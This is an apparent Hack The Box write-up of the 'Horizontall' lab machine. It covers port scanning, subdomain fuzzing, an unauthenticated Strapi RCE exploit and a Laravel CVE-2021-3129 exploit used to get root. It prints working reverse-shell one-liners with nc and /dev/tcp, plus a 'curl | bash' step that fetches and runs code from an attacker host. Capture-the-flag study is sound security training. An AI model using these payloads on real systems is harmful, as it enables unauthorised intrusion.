---
title: "HTB - Horizontall"
date: 2025-07-24
author: "ChaosSec"
tags: ["HTB", "Strapi", "RCE", "Linux"]
summary: ""
---

## 🔍 Port Scanning

```bash
sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.105 -oG allPorts
sudo nmap -sCV -p 22,80 10.10.11.105 -oN targeted
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

Apparently, the machine uses virtual hosting, so we add `horizontall.htb` to `/etc/hosts`.

When visiting the site on port 80, we see a basic page where no buttons work.  
Let’s run fuzzing to check for more hidden routes:

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
```

We get no results. Next step: reviewing the source code.  
It loads various CSS and JS files, including:

```
/js/app.c68eb462.js → http://api-prod.horizontall.htb/reviews
```

That’s a new subdomain! Add it to `/etc/hosts`.

Then fuzz it:

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
```

We find `/admin`, which leads to a Strapi login.  
Fuzzing inside `/admin` reveals `/init`, which returns:

```json
{
  "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
  "currentEnvironment": "development",
  "autoReload": false,
  "strapiVersion": "3.0.0-beta.17.4"
}
```

Searching that Strapi version:

```bash
searchsploit strapi
```

```bash
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                    | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                  | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)            | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)              | nodejs/webapps/50716.rb
```

Nice! We have RCE for this exact version.

Let’s copy the script:

```bash
searchsploit -m multiple/webapps/50239.py
python3 50239.py http://api-prod.horizontall.htb
```

Now we can run commands. Let’s prepare a reverse shell.

In our attacker machine:

```bash
nc -nlvp 443
```

Tried several reverse shells; this one worked:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 443 >/tmp/f
```

Another option:

1. Set up a Python web server
2. Create `index.html` with:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.9/443 0>&1
```

3. On the target:

```bash
curl 10.10.14.9 | bash
```

Now we have a shell as user `strapi`.  
We fix the TTY and explore.

User flag: ✅  
No interesting cronjobs.

Let’s check open ports:

```bash
netstat -nat
```

We find port `8000`. Accessing it locally shows a Laravel 8.0 app.  
We search exploits for it and use:

```bash
https://github.com/nth347/CVE-2021-3129_exploit
```

That gives us another shell — with **root access**. 🏁

🎯 **Machine pwned.**
